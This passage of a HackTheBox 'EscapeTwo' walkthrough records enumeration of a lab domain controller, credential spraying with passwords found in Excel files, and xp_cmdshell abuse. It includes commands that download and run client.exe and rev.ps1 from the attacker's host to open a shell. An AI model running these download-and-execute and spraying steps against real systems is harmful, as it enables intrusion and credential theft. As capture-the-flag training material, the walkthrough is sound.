;; communications error to 10.10.11.51#53: timed out
;; communications error to 10.10.11.51#53: timed out
;; communications error to 10.10.11.51#53: timed out

; <<>> DiG 9.20.4-3-Debian <<>> -p 53 -x sequel.htb @sequel.htb
;; global options: +cmd
;; no servers could be reached
```

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ dig -p 53 -x $(pt get rhost) @$(pt get rhost)
;; communications error to 10.10.11.51#53: timed out
;; communications error to 10.10.11.51#53: timed out
;; communications error to 10.10.11.51#53: timed out

; <<>> DiG 9.20.4-3-Debian <<>> -p 53 -x sequel.htb @sequel.htb
;; global options: +cmd
;; no servers could be reached
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ dnsrecon -n $(pt get rhost) -d $(pt get rhost)
[*] std: Performing General Enumeration against: sequel.htb...
[-] DNSSEC is not configured for sequel.htb
[*]      SOA dc01.sequel.htb 10.10.11.51
[*]      NS dc01.sequel.htb 10.10.11.51
[*]      A sequel.htb 10.10.11.51
[*] Enumerating SRV Records
[+]      SRV _ldap._tcp.sequel.htb dc01.sequel.htb 10.10.11.51 389
[+]      SRV _kerberos._udp.sequel.htb dc01.sequel.htb 10.10.11.51 88
[+]      SRV _kerberos._tcp.sequel.htb dc01.sequel.htb 10.10.11.51 88
[+]      SRV _gc._tcp.sequel.htb dc01.sequel.htb 10.10.11.51 3268
[+]      SRV _kerberos._tcp.dc._msdcs.sequel.htb dc01.sequel.htb 10.10.11.51 88
[+]      SRV _ldap._tcp.gc._msdcs.sequel.htb dc01.sequel.htb 10.10.11.51 3268
[+]      SRV _ldap._tcp.dc._msdcs.sequel.htb dc01.sequel.htb 10.10.11.51 389
[+]      SRV _ldap._tcp.pdc._msdcs.sequel.htb dc01.sequel.htb 10.10.11.51 389
[+]      SRV _kpasswd._tcp.sequel.htb dc01.sequel.htb 10.10.11.51 464
[+]      SRV _kpasswd._udp.sequel.htb dc01.sequel.htb 10.10.11.51 464
[+]      SRV _ldap._tcp.ForestDNSZones.sequel.htb dc01.sequel.htb 10.10.11.51 389
[+] 11 Records Found
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt -t 100 -d $(pt get rhost) -r $(pt get rhost)
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     sequel.htb
[+] Threads:    100
[+] Resolver:   sequel.htb
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: gc._msdcs.sequel.htb

Found: domaindnszones.sequel.htb

Found: forestdnszones.sequel.htb

Found: dc01.sequel.htb

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u '' -p ''
nxc smb $(pt get rhost) -u 'a' -p ''
nxc smb $(pt get rhost) -u 'Guest' -p ''
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\:
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\a: STATUS_LOGON_FAILURE
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [-] sequel.htb\Guest: STATUS_ACCOUNT_DISABLED
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)"
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u '' -p '' --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\:
SMB         10.10.11.51     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

## 1433 - MSSQL

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ mssqlclient.py "$(pt get user)":"$(pt get pass)"@$(pt get rhost) -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL (SEQUEL\rose  guest@master)> enable_xp_cmdshell
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
SQL (SEQUEL\rose  guest@master)> enum_logins
name            type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
-------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa              SQL_LOGIN                 0          1               0             0            0              0           0           0           0

BUILTIN\Users   WINDOWS_GROUP             0          0               0             0            0              0           0           0           0

SQL (SEQUEL\rose  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor
----------   --------   ---------------   ----------   -------   -------
SQL (SEQUEL\rose  guest@master)> enum_db
name     is_trustworthy_on
------   -----------------
master                   0

tempdb                   0

model                    0

msdb                     1

SQL (SEQUEL\rose  guest@master)>
```

# User Flag
---

## Auth as rose


### Assumed breach scenario

> As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose / KxEPkKe6R8su`

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set user 'rose'; pt set pass 'KxEPkKe6R8su'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
rose:KxEPkKe6R8su
```

## Auth as oscar


### Domain enumeration


#### Ldeep

```bash
mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s ldap://$(pt get ip) all ldeep/
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null) | {sAMAccountName, memberOf}) | .[]'
{
  "sAMAccountName": "ca_svc",
  "memberOf": [
    "CN=Cert Publishers,CN=Users,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "sql_svc",
  "memberOf": [
    "CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb",
    "CN=SQLServer2005SQLBrowserUser$DC01,CN=Users,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "oscar",
  "memberOf": [
    "CN=Accounting Department,CN=Users,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "ryan",
  "memberOf": [
    "CN=Management Department,CN=Users,DC=sequel,DC=htb",
    "CN=Remote Management Users,CN=Builtin,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "krbtgt",
  "memberOf": [
    "CN=Denied RODC Password Replication Group,CN=Users,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "Guest",
  "memberOf": [
    "CN=Guests,CN=Builtin,DC=sequel,DC=htb"
  ]
}
{
  "sAMAccountName": "Administrator",
  "memberOf": [
    "CN=Group Policy Creator Owners,CN=Users,DC=sequel,DC=htb",
    "CN=Domain Admins,CN=Users,DC=sequel,DC=htb",
    "CN=Enterprise Admins,CN=Users,DC=sequel,DC=htb",
    "CN=Schema Admins,CN=Users,DC=sequel,DC=htb",
    "CN=Administrators,CN=Builtin,DC=sequel,DC=htb"
  ]
}
```

#### Bloodhound

```bash
bloodhound-python -d $(pt get domain) -ns $(pt get ip) -c all --zip -u "$(pt get user)" -p "$(pt get pass)"
```

```bash
~/venv-py3.12/bin/python /opt/sectools/ad/bloodhound-quickwin/bhqc.py --heavy
```

![](/assets/obsidian/aed3923baa812450719f907a81c4558d.png)

![](/assets/obsidian/81612d88b38d42ea7b82aab83fce462b.png)

![](/assets/obsidian/b4e5a914059174c516429802252838a6.png)

### 88 - Kerberos : Domain password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb -k $(pt get dc_fqdn) -u ldeep/_users_enabled.lst -p "$(pt get pass)" --continue-on-success
SMB         DC01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\oscar:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:KxEPkKe6R8su KDC_ERR_PREAUTH_FAILED
```


### User access check

- Bloodhound

![](/assets/obsidian/6710cbb60f0e409e9ec6086445268370.png)

- Mssql

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc mssql "$(pt get ip)" -u "$(pt get user)" -p "$(pt get pass)"
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] sequel.htb\rose:KxEPkKe6R8su
```

- SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.51     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.51     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
SPIDER_PLUS 10.10.11.51     445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.11.51.json".
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Shares:           7 (Accounting Department, ADMIN$, C$, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Readable Shares:  5 (Accounting Department, IPC$, NETLOGON, SYSVOL, Users)
SPIDER_PLUS 10.10.11.51     445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total folders found:  76
SPIDER_PLUS 10.10.11.51     445    DC01             [*] Total files found:    67
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size average:    23.74 KB
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size min:        0 B
SPIDER_PLUS 10.10.11.51     445    DC01             [*] File size max:        512 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ cat "/tmp/nxc_hosted/nxc_spider_plus/$(pt get ip).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
Users/Default/NTUSER.DAT.LOG1                                                                                            2018-09-15 14:09:26  56 KB
Users/Default/NTUSER.DAT.LOG2                                                                                            2018-09-15 14:09:26  0 B
Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk                      2018-09-15 15:12:15  1.12 KB
[...]
Accounting Department/accounting_2024.xlsx                                                                               2024-06-09 18:50:41  9.98 KB
Accounting Department/accounts.xlsx                                                                                      2024-06-09 18:52:21  6.62 KB
SYSVOL/sequel.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                                2025-01-03 19:29:09  23 B
SYSVOL/sequel.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf       2025-01-03 19:29:09  7.3 KB
SYSVOL/sequel.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf       2025-01-03 19:29:53  2 KB
Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini                            2025-01-04 23:34:29  568 B
Users/Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/desktop.ini                              2025-01-04 23:34:29  328 B
Users/Default/NTUSER.DAT                                                                                                 2025-01-04 23:58:29  256 KB
SYSVOL/sequel.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                                2025-01-05 00:19:49  23 B
SYSVOL/sequel.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                                   2025-01-05 00:19:49  3.53 KB
SYSVOL/sequel.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/comment.cmtx                                   2025-01-05 00:19:49  554 B
```

Check for GPP passwords

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ Get-GPPPassword.py "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"@"$(pt get rhost)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Listing shares...
  - Accounting Department
  - ADMIN$
  - C$
  - IPC$
  - NETLOGON
  - SYSVOL
  - Users

[*] Searching *.xml files...
```

### (Failed) Kerberoasting

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip $(pt get ip) "$(pt get domain)/$(pt get user):$(pt get pass)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 15:58:42.689521  2025-01-17 12:44:15.683455
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-01-17 16:22:32.237127  2025-01-17 15:42:02.136548



[-] CCache file is not found. Skipping...
```

```bash
hashcat kerberoastables.txt /opt/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule
hashcat kerberoastables.txt /usr/share/seclists/Passwords/common_corporate_passwords.lst
hashcat kerberoastables.txt /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```


### Credentials in excel files

Dump files under `Accounting Department` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ SHARE='Accounting Department'; mkdir -p "loot/smb/${SHARE}"; smbclient -U "$(pt get user)%$(pt get pass)" "//$(pt get ip)/${SHARE}" -c "lcd \"loot/smb/${SHARE}\"; prompt OFF; mget *"
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
getting file \accounts.xlsx of size 6780 as accounts.xlsx (1.6 KiloBytes/sec) (average 2.1 KiloBytes/sec)
```

- **libre office** failed to open the `xlsx` files and showed that they are broken

![](/assets/obsidian/45cbdb0753ffe919d5673f78df2a1901.png)

The files don't seem to be corrupted, they can still be repaired. If not, we can unzip them and view `sheet`'s XML file directly.

```bash
┌──(bravosec㉿fsociety)-[~/…/EscapeTwo/loot/smb/Accounting Department]
└─$ file *
accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1284, method=deflate
accounts.xlsx:        Zip archive data, made by v2.0, extract using at least v2.0, last modified, last modified Sun, Jun 09 2024 10:47:44, uncompressed size 681, method=deflate
```

Open the files with **Microsoft Excel** to repair them

```bash
┌──(bravosec㉿fsociety)-[~/…/EscapeTwo/loot/smb/Accounting Department]
└─$ cd ..

┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo/loot/smb]
└─$ cp -r Accounting\ Department /media/sf_Kali/tmp
```

- Select `Open and repair`

![](/assets/obsidian/db165d6432b6132cfa97e37cd6c50559.png)

![](/assets/obsidian/d34f7a8145c129c624ac54cf4eedcfa5.png)

![](/assets/obsidian/ccc10e594f39799d09691e594a95ecb6.png)

![](/assets/obsidian/98143595a1674a882afc7c1256b97b6c.png)

Save the passwords to a wordlist

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ cat pass.txt
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo
MSSQLP@ssw0rd!
```

### 88 - Kerberos : Domain password spray

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb -k $(pt get dc_fqdn) -u ldeep/_users_enabled.lst -p pass.txt --continue-on-success
SMB         DC01.sequel.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:0fwz7Q4mSpurIt99 KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:86LxLBMgEWaKUnBG KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:Md9Wlq1E5bZnVDVo KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator:MSSQLP@ssw0rd! KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ca_svc: KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\rose: KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\sql_svc: KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\ryan: KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\michael: KDC_ERR_PREAUTH_FAILED
SMB         DC01.sequel.htb 445    DC01             [-] sequel.htb\Administrator: KDC_ERR_PREAUTH_FAILED
```

## Shell as sql_svc


### User access check

- Bloodhound

![](/assets/obsidian/299cc86b7d3cea60e1a1846d345aaa78.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set user 'oscar'; pt set pass '86LxLBMgEWaKUnBG'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
oscar:86LxLBMgEWaKUnBG
```

- WMI

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -X "\$RSSH_FP='C:\programdata\client.exe'; if (\!(Test-Path -PathType Leaf \$RSSH_FP)) { (new-object System.Net.WebClient).DownloadFile('http://$(pt get lhost)/client.exe', \$RSSH_FP); }; if (\!(Get-WmiObject Win32_Process | ? ExecutablePath -eq \$RSSH_FP)) { start-process -WindowStyle hidden \$RSSH_FP }" --no-output --exec-method smbexec --log nxc_wmi.log
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
```

- SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" --shares
SMB         10.10.11.51     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
SMB         10.10.11.51     445    DC01             [*] Enumerated shares
SMB         10.10.11.51     445    DC01             Share           Permissions     Remark
SMB         10.10.11.51     445    DC01             -----           -----------     ------
SMB         10.10.11.51     445    DC01             Accounting Department READ
SMB         10.10.11.51     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.51     445    DC01             C$                              Default share
SMB         10.10.11.51     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.51     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.51     445    DC01             SYSVOL          READ            Logon server share
SMB         10.10.11.51     445    DC01             Users           READ
```

### 1433 - MSSQL : xp_cmdshell

Validate `sa`'s credential gathered from `accounts.xlsx`

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ nxc mssql "$(pt get ip)" -u 'sa' -p 'MSSQLP@ssw0rd!' --local-auth
MSSQL       10.10.11.51     1433   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)
MSSQL       10.10.11.51     1433   DC01             [+] DC01\sa:MSSQLP@ssw0rd! (Pwn3d!)
```

Connect with **mssqlclient**

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ pt set user 'sa'; pt set pass 'MSSQLP@ssw0rd!'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
sa:MSSQLP@ssw0rd!

┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ mssqlclient.py "$(pt get user)":"$(pt get pass)"@$(pt get rhost)
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
```

Enable `enable_xp_cmdshell` since we are **server admin**

```bash
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

Get a reverse shell

```bash
┌──(bravosec㉿fsociety)-[~/htb/EscapeTwo]
└─$ python ~/scripts/windows/powershell_base64.py <(echo "iex (new-object net.webclient).DownloadString('http://$(pt get lhost)/rev.ps1')")
